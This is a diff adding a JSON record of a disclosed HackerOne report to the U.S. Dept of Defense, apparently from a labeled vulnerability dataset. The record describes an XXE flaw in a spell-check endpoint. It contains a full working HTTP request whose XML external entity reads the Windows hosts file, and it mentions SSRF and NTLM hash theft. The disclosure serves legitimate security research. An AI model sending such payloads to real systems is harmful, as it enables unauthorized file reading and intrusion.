@@ -1,0 +1,42 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "cdl ",
+  "title": "[HTA2] XXE on https://\u2588\u2588\u2588 via SpellCheck Endpoint.",
+  "content": "\nSummary:\nThere is a full read XXE vulnerability on\nSteps To Reproduce:\nLog into https://\u2588\u2588\u2588\u2588\u2588\u2588/ with the credentials \u2588\u2588\u2588\u2588\u2588\u2588\nGet your cookies and make the following HTTP Request with them\nCode 1.74 KiB\n1POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: text/xml; charset=UTF-8\n8Content-Length: 1238\n9Connection: close\n10Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx?EventAction=AddEvent&EventDate=10/16/2019%2012:00:01%20AM\n11Cookie: [COOKIES]\n12\n13<?xml version=\"1.0\"?>\n14<!DOCTYPE r [<!ENTITY a SYSTEM \"file:///c:\\Windows\\System32\\Drivers\\etc\\hosts\">]>\n15<r><resp>xml</resp><textToCheck>&a;</textToCheck><IAW/><UserDictionaryFile/><DictFile>d:\\Meridian\\MWRA\\MG\\11.1\\KView\\CustomCodeBehind\\Base/en-US/DICT-EN-US-USEnglish.dict</DictFile><SuggestionsMethod>HASHING_SUGGESTIONS</SuggestionsMethod><LanguageParser>ENGLISH</LanguageParser><SeparateHyphenWords>False</SeparateHyphenWords><V2Parser>True</V2Parser><SSLFriendlyPage>/KView/CustomCodeBehind/WebResource.axd?d=zqrwmEhOpCtb9wLAM9uWrOzT_jYv5Un0ehQNczyIJSp-b9XbsULhZuZahCBf8Qk8anUm2kaMbXSDgD8qtwoc7T6Vnc9cbWVmTwIkPCbvIqLzTEGbDgA2oGtmx8o1&amp;t=633221022140000000</SSLFriendlyPage><SuggestSplitWords>True</SuggestSplitWords><IncludeUserDictionaryInSuggestions>True</IncludeUserDictionaryInSuggestions><WarnDuplicates>True</WarnDuplicates><IgnoreWordsWithDigits>True</IgnoreWordsWithDigits><CheckCompoundWords>False</CheckCompoundWords><LookIntoHyphenatedText>True</LookIntoHyphenatedText><GuiLanguage>ENGLISH</GuiLanguage><IgnoreXML>False</IgnoreXML><IgnoreCapitalizedWords>False</IgnoreCapitalizedWords><ConsiderationRange>-1</ConsiderationRange><IgnoreURLsAndEmailAddresses>True</IgnoreURLsAndEmailAddresses><AllowMixedCase>False</AllowMixedCase></r>\nYou will see the contents of c:\\Windows\\System32\\Drivers\\etc\\hosts in the response:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nWe can also make HTTP requests to external and internal applications and read the full responses. We can also like steal NTLM domain hashes.\n\u2588\u2588\u2588\u2588\nSupporting Material/References:\nhttps://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/\nImpact\nCritical, an attacker can read local files, make HTTP requests to internal applications and read the responses, steal NTLM hashes, and also completely deny service to the application.\nBest,\nCorben Leo (@cdl)\n\n",
+  "severity": [
+    9.1,
+    null
+  ],
+  "bounty": 5000,
+  "weaknesses": [
+    "XML External Entities (XXE)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1684177980,
+  "report_url": "https://hackerone.com/reports/715949",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Log into the target system with provided credentials to obtain session cookies."
+    ],
+    [
+      2,
+      "Send a crafted XML request with an external entity reference to the spell check endpoint to read local files or make HTTP requests."
+    ]
+  ],
+  "vuln_description": "The vulnerability is an XML External Entity (XXE) attack that allows an attacker to read local files, make HTTP requests to internal applications, and potentially steal NTLM hashes by exploiting a spell check endpoint that processes XML input without proper sanitization.",
+  "reason": "The attack involves a straightforward exploitation of an XXE vulnerability in a spell check endpoint, which is a well-documented and common vulnerability pattern. The steps to reproduce are simple and do not require complex interactions or state manipulation.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XXE vulnerability involves sending a crafted XML payload to a specific endpoint, which is not related to authentication or authorization boundaries being crossed. The methodology described focuses on testing AuthN/AuthZ bypasses and IDORs by swapping user sessions and resource IDs, which does not apply to the XXE vulnerability.",
+    "is_detectable": false
+  }
+}
